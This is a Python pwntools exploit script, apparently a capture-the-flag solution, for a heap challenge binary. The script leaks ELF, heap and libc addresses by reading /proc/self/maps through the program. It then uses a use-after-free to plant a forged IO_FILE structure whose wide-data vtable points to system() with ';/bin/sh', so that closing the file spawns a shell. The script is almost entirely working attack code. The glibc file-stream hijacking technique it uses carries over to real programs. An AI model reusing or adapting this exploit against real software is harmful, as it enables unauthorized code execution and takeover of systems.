#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./file_patched')
libc = ELF('./libc.so.6')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 1
if local:
    p = process([elf.path])
else:
    p = remote('localhost', 8888)

def open_file(filename):
    sla('> ', '1')
    sla('> ', '1')
    sla('filename: ', filename)

def show_file():
    sla('> ', '1')
    sla('> ', '2')

def close_file():
    sla('> ', '1')
    sla('> ', '3')

def add(idx, sz, data):
    sla('> ', '2')
    sla('> ', '1')
    sla('Index: ', str(idx))
    sla('Size: ', str(sz))
    sa('Content: ', data)

def show(idx):
    sla('> ', '2')
    sla('> ', '2')
    sla('Index: ', str(idx))

def delete(idx):
    sla('> ', '2')
    sla('> ', '3')
    sla('Index: ', str(idx))

# leak elf & heap & libc
open_file('/proc/self/maps')
show_file()
data = ru('showfile success!\n').split('\n')
elf_base = int(data[0][:12], 16)
info('elf_base = ' + hex(elf_base))
heap_base = int(data[6][:12], 16)
info('heap_base = ' + hex(heap_base))
libc_base = int(data[8][:12], 16)
info('libc_base = ' + hex(libc_base))
system = libc_base + libc.sym['system']
info('system = ' + hex(system))
IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
info('IO_wfile_jumps = ' + hex(IO_wfile_jumps))

# https://bbs.pediy.com/thread-273832.htm#%E5%88%A9%E7%94%A8_io_wfile_overflow%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81
# add a fake file to overwrite fd
fake_vtable = elf_base + 0x0
close_file()
add(0, 0x1d8, 'A' * 8) # 0
delete(0)
open_file('./file') # open file to get the chunk
delete(0) # free the fd chunk
fake_file = ( # fake file structure
    ip32(~(2 | 0x8 | 0x800)) + # 0x0 : _flags
    ';/bin/sh\x00'.ljust(0x14, '\x00') + # system command
    up64(0) + # 0x18 : _wide_data->_IO_write_base
    '\x00' * 0x10 + 
    up64(0) + # 0x30 : _wide_data->_IO_buf_base
    '\x00' * 0x30 + 
    up64(system) + # 0x68 : _wide_data->_wide_vtable->doallocate
    '\x00' * 0x30 + 
    up64(heap_base + 0x2a0) + # 0xa0 : _wide_data
    '\x00' * 0x30 + 
    up64(IO_wfile_jumps - 0x70) + # 0xd8 : vtable
    up64(heap_base + 0x2a0) # 0xe0 : _wide_data->_wide_vtable
)
add(1, 0x1d8, fake_file) # edit IO_FILE structure

#gdb.attach(p, 'b *(_IO_file_close_it+104)\nb _IO_wfile_overflow\nb *(_IO_wdoallocbuf+43)\nc')
close_file()

p.interactive()

